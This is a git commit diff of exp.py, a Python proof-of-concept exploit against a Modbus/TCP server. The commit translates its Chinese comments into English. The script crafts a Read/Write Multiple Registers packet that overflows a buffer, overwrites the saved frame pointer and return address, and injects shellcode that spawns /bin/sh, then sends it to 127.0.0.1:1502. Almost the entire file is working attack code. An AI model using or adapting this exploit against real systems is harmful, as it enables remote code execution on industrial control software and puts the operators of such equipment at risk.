b162f2fd10a70596372f951f725e350abe62522a
wwww-sudo <2430993542@qq.com>
2025-07-11 19:08:10 +0800

    Update exp.py

--- exp.py
+++ exp.py
@@ -1,65 +1,71 @@
 import socket
 from pwn import *
 
+# shellcode to execute /bin/sh
 shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
 
+# some context-related addresses in the server's memory (hardcoded here)
 ctx = 0x804c1a0
 req = 0x804c1f0
 req_length = 0x104
 mb_mapping = 0x804c300
-ret = p32(0xffffd070)
-# 构造 Modbus/TCP 报文
+
+# address to overwrite the return address with
+ret = p32(0xffffd070)       
+
+# build the malicious Modbus/TCP packet
 def build_modbus_packet():
-    # 对应的十六进制包：
-    # <00><01><00><00><00><09><FF><17><00><10><00><02><00><20><00><01><02><00><64>
-    transaction_id = b'\x00\x01'             # 事务标识符
-    protocol_id = b'\x00\x00'                # 协议标识符（固定为0）
-    length = b'\x00\x0F'                     # 数据长度
-    unit_id = b'\xFF'                        # 单元标识符
-    function_code = b'\x17'                  # 功能码（23 Read Write Multiple Registers）
+    # Transaction header fields
+    transaction_id = b'\x00\x01'           # Transaction Identifier
+    protocol_id = b'\x00\x00'              # Protocol Identifier (always 0 for Modbus)
+    length = b'\x00\x0F'                   # Length of remaining bytes
+    unit_id = b'\xFF'                      # Unit Identifier
+    function_code = b'\x17'               # Function code: 23 (Read/Write Multiple Registers)
 
-    # PDU 部分
-    read_reference_number = b'\x00\x00'      # 读取起始地址
-    read_word_count = b'\x01\xff'            # 读数量
-    write_reference_number = b'\x00\x91'     # 写入起始地址
-    write_word_count = b'\x0f\xff'           # 写入数量
-    byte_count = b'\xF3'                     # 写入字节长度,MaxF3
-    data = b'\x00\xcf\x00'                   # cyc
-    data += b'\x00'*2           
-    data += b'\x00'*0x14                     # padding
-    data += b'\x9f\x00'                      # i
-    data += b'\x00'*22                       # padding 
-    data += b'\x5d\x01'                      # rsp_length
-    data += b'\x00'*6                        # padding 
-    data += b'\x11'*4                        # ebp
-    data += ret                               # ret
-    data += p32(ctx)
-    data += p32(req)
-    data += p32(req_length)
-    data += p32(mb_mapping)
-    data += shellcode
-    data += b'\x55'*0x100
+    # PDU (Protocol Data Unit)
+    read_reference_number = b'\x00\x00'   # Read starting address
+    read_word_count = b'\x01\xff'         # Number of words to read
+    write_reference_number = b'\x00\x91' # Write starting address
+    write_word_count = b'\x0f\xff'       # Number of words to write
+    byte_count = b'\xF3'                  # Number of bytes to write
 
-    # 拼接完整的 Modbus/TCP 包
-    pdu = read_reference_number + read_word_count + write_reference_number + write_word_count+ byte_count + data
+    data = b'\x00\xcf\x00'                # Custom payload
+    data += b'\x00'*2                    # Padding
+    data += b'\x00'*0x14                 # More padding
+    data += b'\x9f\x00'                  # Custom value
+    data += b'\x00'*22                   # More padding
+    data += b'\x5d\x01'                  # Custom response length
+    data += b'\x00'*6                    # More padding
+    data += b'\x11'*4                    # Overwrite saved EBP
+    data += ret                          # Overwrite return address
+    data += p32(ctx)                     # Context pointer
+    data += p32(req)                     # Request pointer
+    data += p32(req_length)             # Request length
+    data += p32(mb_mapping)             # Modbus mapping pointer
+    data += shellcode                   # Injected shellcode
+    data += b'\x55'*0x100               # Fill remaining buffer with padding
+
+    # Construct full Modbus/TCP packet
+    pdu = read_reference_number + read_word_count + write_reference_number + write_word_count + byte_count + data
     packet = transaction_id + protocol_id + length + unit_id + function_code + pdu
     return packet
 
 
-# 发送 Modbus/TCP 报文
+# send the crafted Modbus/TCP packet to the target server
 def send_modbus_packet():
-    server_address = ('127.0.0.1', 1502)  # 目标地址和端口
+    server_address = ('127.0.0.1', 1502)  # target IP and port
     modbus_packet = build_modbus_packet()
 
-    # 创建 TCP 连接
+    # establish TCP connection
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
         client_socket.connect(server_address)
         print(f'Sending: {modbus_packet.hex()}')
         client_socket.sendall(modbus_packet)
 
-        # 接收响应
+        # receive server response (if any)
         response = client_socket.recv(1024)
         print(f'Received: {response.hex()}')
 
-# 调用发送函数
+
+# execute the attack
 send_modbus_packet()
